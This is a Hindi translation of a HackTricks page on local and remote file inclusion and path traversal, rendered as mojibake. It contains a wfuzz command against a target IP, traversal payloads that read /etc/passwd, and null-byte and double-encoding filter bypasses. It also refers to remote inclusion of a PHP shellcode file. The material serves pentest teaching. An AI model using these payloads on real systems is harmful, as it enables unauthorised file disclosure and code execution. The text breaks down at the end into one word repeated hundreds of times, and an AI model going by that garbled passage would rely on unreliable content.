# рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢ / рдкрде рдЪрд╛рд▓рди

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рд▓реАрдкреНрдд рд╣реЛрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреА рд╣реИрдХрд┐рдВрдЧ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдХрджрдо рд╕реЗ рдХрджрдо рд░рд╣реЗрдВ рдФрд░ рдЕрдкрдбреЗрдЯреНрд╕ рдкрд░ рдЕрдВрджрд░реВрдиреА рджреГрд╖реНрдЯрд┐ рдмрдирд╛рдПрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЕрдкрдбреЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

## рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢

**рджреВрд░рд╕реНрде рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢ (RFI):** рдлрд╝рд╛рдЗрд▓ рдПрдХ рджреВрд░рд╕реНрде рд╕рд░реНрд╡рд░ рд╕реЗ рд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ (рд╕рд░реНрд╡рд╢реНрд░реЗрд╖реНрда: рдЖрдк рдХреЛрдб рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рд┐рдд рдХрд░реЗрдЧрд╛)ред Php рдореЗрдВ рдпрд╣ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реИ** (**allow\_url\_include**)ред\
**рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢ (LFI):** рд╕рд░реНрд╡рд░ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИред

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рд╡рдВрд▓рд░реЗрдмрд▓ **PHP рдлрд╝рдВрдХреНрд╢рдиреНрд╕**: require, require\_once, include, include\_once

рдЗрд╕ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖ рдХреЛ рд╢реЛрдзрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рджрд┐рд▓рдЪрд╕реНрдк рдЙрдкрдХрд░рдг: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## рдмреНрд▓рд╛рдЗрдВрдб - рджрд┐рд▓рдЪрд╕реНрдк - LFI2RCE рдлрд╝рд╛рдЗрд▓реЗрдВ
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**рдХрдИ \*nix LFI рд╕реВрдЪрд┐рдпреЛрдВ рдХреЛ рдорд┐рд╢реНрд░рд┐рдд рдХрд░рдХреЗ рдФрд░ рдЕрдзрд┐рдХ рдкрде рдЬреЛрдбрд╝рдХрд░ рдореИрдВрдиреЗ рдпрд╣ рдПрдХ рдмрдирд╛рдпрд╛ рд╣реИ:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

рдЖрдк `/` рдХреЛ `\` рдХреЗ рд▓рд┐рдП рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ\
рдЖрдк `../../../../../` рднреА рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ

рдПрдХ рд╕реВрдЪреА рдЬреЛ рдлрд╝рд╛рдЗрд▓ /etc/password рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ (рдХрд┐ рдХреНрдпрд╛ рд╕рдВрдХреНрд░рдордг рд╣реИ) рдпрд╣рд╛рдВ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

рд╡рд┐рднрд┐рдиреНрди рд╢рдмреНрдж рд╕реВрдЪрд┐рдпреЛрдВ рдХрд╛ рдорд┐рд╢реНрд░рдг:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

рдЖрдк `/` рдХреЛ `\` рдХреЗ рд▓рд┐рдП рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ\
рдЖрдк `C:/` рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ `../../../../../` рдЬреЛрдбрд╝рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ

рдПрдХ рд╕реВрдЪреА рдЬреЛ рдлрд╝рд╛рдЗрд▓ /boot.ini рдХреЛ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИ (рдХрд┐ рдХреНрдпрд╛ рд╕рдВрдХреНрд░рдордг рд╣реИ) рдпрд╣рд╛рдВ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Linux рдХреА LFI рд╕реВрдЪреА рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ.

## рдореВрд▓ LFI рдФрд░ рдмрд╛рдпрдкрд╛рд╕

рд╕рднреА рдЙрджрд╛рд╣рд░рдг рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди рдХреЗ рд▓рд┐рдП рд╣реИрдВ рд▓реЗрдХрд┐рди рдЗрд╕реЗ рджреВрд░рд╕реНрде рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди рдореЗрдВ рднреА рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдкреГрд╖реНрда=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╕реАрдХреНрд╡реЗрдВрд╕реЗрд╕ рд╕реНрдЯреНрд░рд┐рдкреНрдб рдЧреИрд░-рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐рдХрд░рдг
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **рдирд▓ рдмрд╛рдЗрдЯ (%00)**

рдкреНрд░рджрд╛рди рдХреА рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рдЕрдВрдд рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд░реНрдг рдЬреЛрдбрд╝реЗрдВ (рдмрд╛рдЗрдкрд╛рд╕: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
рдпрд╣ **PHP 5.4 рд╕реЗ рд╣рд▓ рд╣реЛ рдЧрдпрд╛ рд╣реИ**

### **рдЗрдВрдХреЛрдбрд┐рдВрдЧ**

рдЖрдк рдбрдмрд▓ URL рдЗрдВрдХреЛрдб (рдФрд░ рдЕрдиреНрдп) рдЬреИрд╕реЗ рдЧреИрд░-рдорд╛рдирдХ рдЗрдВрдХреЛрдбрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### рдореМрдЬреВрджрд╛ рдлрд╝реЛрд▓реНрдбрд░ рд╕реЗ

рд╢рд╛рдпрдж рдмреИрдХ-рдПрдВрдб рдлрд╝реЛрд▓реНрдбрд░ рдкрде рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИ:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### рд╕рд░реНрд╡рд░ рдкрд░ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ

рд╕рд░реНрд╡рд░ рдХреЗ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╡рд┐рд╢реЗрд╖ рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╢реНрд░реЗрдгреАрдмрджреНрдз рд░реВрдк рд╕реЗ рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдХреЛ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХреЗ, рдХреЗрд╡рд▓ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдирд╣реАрдВред рдпрд╣ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЧрд╣рд░рд╛рдИ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг рдХрд░рдиреЗ рдФрд░ рд╡рд┐рд╢реЗрд╖ рдлрд╝реЛрд▓реНрдбрд░ рдХреА рдореМрдЬреВрджрдЧреА рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреА рд╣реИред рдиреАрдЪреЗ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рд╡рд┐рд╕реНрддреГрдд рддрд░реАрдХрд╛ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

1. **рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЧрд╣рд░рд╛рдИ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рдг:** `/etc/passwd` рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рдкреНрд░рд╛рдкреНрдд рдХрд░рдХреЗ рдЕрдкрдиреА рд╡рд░реНрддрдорд╛рди рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЧрд╣рд░рд╛рдИ рдХрд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдВ (рдпрджрд┐ рд╕рд░реНрд╡рд░ рд▓рд┐рдирдХреНрд╕-рдЖрдзрд╛рд░рд┐рдд рд╣реИ)ред рдПрдХ рдЙрджрд╛рд╣рд░рдг URL рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдврдВрдЧ рд╕реЗ рд╕рдВрд░рдЪрд┐рдд рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЬреЛ рддреАрди рдХреА рдЧрд╣рд░рд╛рдИ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **рдлреЛрд▓реНрдбрд░ рдХреЗ рд▓рд┐рдП рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:** рд╕рдВрджрд┐рдЧреНрдз рдлреЛрд▓реНрдбрд░ рдХрд╛ рдирд╛рдо (рдЬреИрд╕реЗ, `private`) URL рдореЗрдВ рдЬреЛрдбрд╝реЗрдВ, рдлрд┐рд░ `/etc/passwd` рдкрд░ рд╡рд╛рдкрд╕ рдЬрд╛рдПрдВред рдЕрддрд┐рд░рд┐рдХреНрдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╕реНрддрд░ рдХреЛ рдПрдХ рдмрдврд╝рд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **рдкрд░рд┐рдгрд╛рдореЛрдВ рдХрд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд░реЗрдВ:** рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЗрд╕рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддреА рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдореМрдЬреВрдж рд╣реИ:
   * **рддреНрд░реБрдЯрд┐ / рдХреЛрдИ рдЖрдЙрдЯрдкреБрдЯ рдирд╣реАрдВ:** рд╕рдВрднрд╛рд╡рдирд╛ рд╣реИ рдХрд┐ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рд╕реНрдерд╛рди рдкрд░ `private` рдлрд╝реЛрд▓реНрдбрд░ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИред
   * **`/etc/passwd` рдХреА рд╕рд╛рдордЧреНрд░реА:** `private` рдлрд╝реЛрд▓реНрдбрд░ рдХреА рдореМрдЬреВрджрдЧреА рдкреБрд╖реНрдЯрд┐ рдХрд░рддреА рд╣реИред
4. **рд░реВрдврд╝рд┐рд╡рд╛рджреА рдЕрдиреНрд╡реЗрд╖рдг:** рдЦреЛрдЬреЗ рдЧрдП рдлрд╝реЛрд▓реНрдбрд░ рдХреЛ рдЙрдкрдлрд╝реЛрд▓реНрдбрд░ рдпрд╛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рд▓рд┐рдП рдФрд░ рднреА рдЬрд╛рдВрдЪрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЙрд╕реА рддрдХрдиреАрдХ рдпрд╛ рдкрд╛рд░рдВрдкрд░рд┐рдХ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рд╡рд┐рдзрд┐рдпреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред

рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рдирд┐рд░реНрджреЗрд╢рд┐рддрд░реВрдк рд╕реЗ рдирд┐рд░реНрджреЗрд╢рд┐рддрд░реВрдк рд╕реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдд 